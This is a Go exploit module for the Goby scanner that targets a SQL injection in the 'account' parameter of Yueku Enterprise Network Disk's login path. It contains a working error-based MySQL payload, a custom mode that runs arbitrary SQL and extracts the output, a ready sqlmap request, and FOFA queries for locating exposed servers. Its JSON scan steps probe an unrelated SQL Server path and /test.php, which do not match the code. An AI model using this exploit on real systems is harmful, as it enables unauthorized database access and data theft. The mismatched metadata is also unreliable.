package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yueku Enterprise Network Disk /user/login/.html SQL Injection Vulnerability",
    "Description": "<p>Yueku Enterprise Cloud Disk is a privately deployed secure and simple enterprise file management system designed to meet the needs of enterprise file management, collaborative office, and file sharing. </p><p> Yueku Enterprise Cloud Disk has a SQL injection vulnerability in the POST request parameter account under the /user/login/.html path. An attacker can obtain sensitive database information or even obtain permissions by constructing a payload.</p>",
    "Product": "YDisk-NetDisk",
    "Homepage": "https://www.ydisk.cn/",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-07-11",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"src='/js/ydisk.js?v=\" && body=\"href='/theme/default/ydisk.css?v=\"",
    "GobyQuery": "body=\"src='/js/ydisk.js?v=\" && body=\"href='/theme/default/ydisk.css?v=\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the POST request parameter account in the /user/login/.html path of Yueku Enterprise Network Disk. Attackers can obtain sensitive database information and even obtain permissions by constructing a payload.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to upgrade to a secure version. </p><p>2. Use waf to filter SQL statements.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/yer/html/nodes/linkntb/linkntb.jsp?pageId=linkntb&billId=1%27)%20and%201=@@version--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SQL Server",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/yer/html/nodes/linkntb/linkntb.jsp",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/yer/html/nodes/linkntb/linkntb.jsp"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.7",
    "Translation": {
        "CN": {
            "Name": "悦库企业网盘 /user/login/.html SQL 注入漏洞",
            "Product": "悦库-悦库网盘",
            "Description": "<p>悦库企业网盘是一款专为满足企业文件管理、协同办公、文件共享需求而设计的私有部署安全、简单的企业文件管理系统。<br></p><p>悦库企业网盘 /user/login/.html路径下POST请求参数account存在SQL注入漏洞，攻击者可以通过构造payload获取数据库敏感信息，甚至获取权限。<br></p>",
            "Recommendation": "<p>1、联系厂商升级至安全版本。</p><p>2、使用waf过滤sql语句。</p>",
            "Impact": "<p>悦库企业网盘 /user/login/.html路径下POST请求参数account存在SQL注入漏洞，攻击者可以通过构造payload获取数据库敏感信息，甚至获取权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yueku Enterprise Network Disk /user/login/.html SQL Injection Vulnerability",
            "Product": "YDisk-NetDisk",
            "Description": "<p>Yueku Enterprise Cloud Disk is a privately deployed secure and simple enterprise file management system designed to meet the needs of enterprise file management, collaborative office, and file sharing.&nbsp;</p><p>&nbsp;Yueku Enterprise Cloud Disk has a SQL injection vulnerability in the POST request parameter account under the /user/login/.html path. An attacker can obtain sensitive database information or even obtain permissions by constructing a payload.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to upgrade to a secure version.&nbsp;</p><p>2. Use waf to filter SQL statements.</p>",
            "Impact": "<p>There is a SQL injection vulnerability in the POST request parameter account in the /user/login/.html path of Yueku Enterprise Network Disk. Attackers can obtain sensitive database information and even obtain permissions by constructing a payload.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10969"
}`

	setSqlPayloadHash_WglXwGGvJy2AmVlh := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		data := "account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597," + sql + "))),0x7e),5597)-- HZLK"

		//漏洞url地址
		url := "/user/login/.html"
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk",
			"Content-Type": "application/x-www-form-urlencoded",
		}

		resp, err = setPostRequest(hostInfo, url, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = url

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "ydisk"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "database()"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `~(.*?)~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_WglXwGGvJy2AmVlh
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /user/login/.html HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\nContent-Type: application/x-www-form-urlencoded\n \naccount=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,database()))),0x7e),5597)-- HZLK"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `~(.*?)~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHash_WglXwGGvJy2AmVlh
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
